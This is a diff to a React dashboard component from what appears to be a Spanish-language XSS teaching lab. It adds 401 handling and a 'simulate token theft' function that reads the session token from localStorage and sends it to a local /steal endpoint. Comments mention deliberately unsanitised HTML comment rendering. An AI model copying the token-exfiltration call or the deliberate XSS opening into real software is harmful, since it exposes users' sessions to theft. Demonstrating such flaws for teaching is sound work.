@@ -1,22 +1,44 @@
 import { useState, useEffect } from "react";
+import { useNavigate } from "react-router-dom"; 
 
 function Dashboard() {
   const [message, setMessage] = useState("");
   const [comment, setComment] = useState("");
   const [comments, setComments] = useState([]);
   const [pushup, setPushup] = useState(null);
+  
+  const navigate = useNavigate(); // Instanciamos el hook
 
   useEffect(() => {
     const token = localStorage.getItem("token");
 
-    // SOLUCIÓN AL ERROR: El puerto se cambió de 3000 a 4000
+    // Si por algún motivo entra sin token, lo sacamos directamente
+    if (!token) {
+      navigate("/");
+      return;
+    }
+
     fetch("http://localhost:4000/dashboard", {
       headers: {
         Authorization: "Bearer " + token
       }
     })
-      .then(res => {
-        if(!res.ok) throw new Error("No autorizado");
+      .then(async (res) => {
+        // 3. CAPTURAMOS EL ERROR 401 (Token expirado o inválido)
+        if (res.status === 401) {
+          const errorData = await res.json();
+          console.warn("SESIÓN RECHAZADA (Abisai Ruiz):", errorData.message);
+          
+          // Mostramos alerta, borramos el token inservible y redirigimos
+          alert(errorData.message); 
+          localStorage.removeItem("token");
+          navigate("/"); 
+          
+          throw new Error("Sesión expirada");
+        }
+        
+        if(!res.ok) throw new Error("Error en la petición");
+        
         return res.json();
       })
       .then(data => {
@@ -24,27 +46,32 @@ function Dashboard() {
         setMessage(data.message);
       })
       .catch(error => console.error("Error en Dashboard (Abisai Ruiz):", error));
-  }, []);
+  }, [navigate]);
 
   const addComment = () => {
-    // Sigue manteniendo el dangerouslySetInnerHTML como ejemplo de XSS
     setComments([...comments, comment]);
-    setComment("");
+    setComment(""); // Limpiar el input después de agregar
   };
 
-  // Función para activar el Pushup (Popup) mostrando el token
+  // Función para activar el Pushup (Popup) y simular el XSS al endpoint /steal
   const simularRoboToken = () => {
     const token = localStorage.getItem("token") || "No hay token disponible";
     const alertMessage = `Token interceptado: ${token.substring(0, 20)}...`;
     
     console.warn("ALERTA DE SEGURIDAD (Abisai Ruiz):", alertMessage);
     
+    // Enviamos el token robado al backend usando tu ruta /steal
+    fetch(`http://localhost:4000/steal?token=${token}`)
+      .then(res => res.json())
+      .then(data => console.log("Resultado del ataque (Abisai Ruiz):", data.message))
+      .catch(err => console.error("Error al robar token:", err));
+
     setPushup(alertMessage);
     
-    // El pushup desaparece después de 4 segundos
+    // El pushup desaparece después de 5 segundos
     setTimeout(() => {
       setPushup(null);
-    }, 10000);
+    }, 5000);
   };
 
   return (
@@ -58,7 +85,7 @@ function Dashboard() {
       )}
 
       <div className="card" style={{ maxWidth: '100%' }}>
-        <h2 className="title">{message || "Panel de Control"}</h2>
+        <h2 className="title">{message || "Cargando Panel..."}</h2>
         
         {/* Botón para simular el ataque XSS y ver el Pushup */}
         <button 
@@ -73,7 +100,7 @@ function Dashboard() {
           
           <div className="comment-box">
             <input
-              placeholder="Escribe un comentario HTML (ej. <b>Hola</b>)"
+              placeholder="Escribe un comentario HTML (ej. <b style='color:red'>Hola</b>)"
               value={comment}
               onChange={e => setComment(e.target.value)}
             />
